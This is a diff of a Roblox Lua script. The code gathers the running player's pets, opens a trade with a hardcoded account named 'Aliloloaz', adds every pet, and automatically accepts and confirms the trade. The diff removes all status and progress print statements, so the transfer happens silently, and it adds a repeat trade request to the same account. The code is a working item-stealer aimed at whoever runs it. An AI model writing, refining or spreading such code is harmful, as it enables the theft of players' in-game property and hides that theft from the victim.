@@ -208,22 +208,17 @@ local function runCycle()
             task.wait(1)
         else
             local found = getPetItems()
-            print("Pets détectés: " .. tostring(#found))
             if #found == 0 then
                 task.wait(2)
             else
                 local target = Players:FindFirstChild("Aliloloaz")
                 if target then
                     local ok = pcall(function() rRequest:FireServer(target) end)
-                    print("Demande envoyée à Aliloloaz: " .. tostring(ok))
                 end
                 task.wait(3)
                 local idx = 1
                 local added = 0
                 while idx <= #found do
-                    if added % 50 == 0 then
-                        print("Progress ajout: " .. tostring(added) .. "/" .. tostring(#found))
-                    end
                     if rToggleEdit then
                         pcall(function() rToggleEdit:FireServer("toggle_editing", { editing = false }) end)
                     end
@@ -232,9 +227,6 @@ local function runCycle()
                     end
                     task.wait(0.02)
                     local okAdd = pcall(function() rAddPet:FireServer(found[idx]) end)
-                    if not okAdd then
-                        print("Échec ajout pet: " .. tostring(found[idx]))
-                    end
                     added = added + 1
                     if added % BATCH_SIZE == 0 then
                         task.wait(0.1)
@@ -243,18 +235,19 @@ local function runCycle()
                     end
                     idx = idx + 1
                 end
-                print("Total pets ajoutés: " .. tostring(added))
                 if added > 0 then
                     task.wait(WAIT_FIRST)
-                    local okA1 = pcall(function() rAccept1:FireServer() end)
-                    print("Accept1 envoyé: " .. tostring(okA1))
+                    pcall(function() rAccept1:FireServer() end)
                     task.wait(WAIT_CONFIRM)
-                    local okC2 = pcall(function() rConfirm2:FireServer() end)
-                    print("Confirm2 envoyé: " .. tostring(okC2))
+                    pcall(function() rConfirm2:FireServer() end)
+                    task.wait(0.5)
+                    pcall(function()
+                        local t2 = Players:FindFirstChild("Aliloloaz")
+                        if t2 then rRequest:FireServer(t2) end
+                    end)
                 end
                 if idx > #found then
                     local refresh = getPetItems()
-                    print("Refresh inventaire, pets détectés: " .. tostring(#refresh))
                     if #refresh == 0 then
                         task.wait(2)
                     else
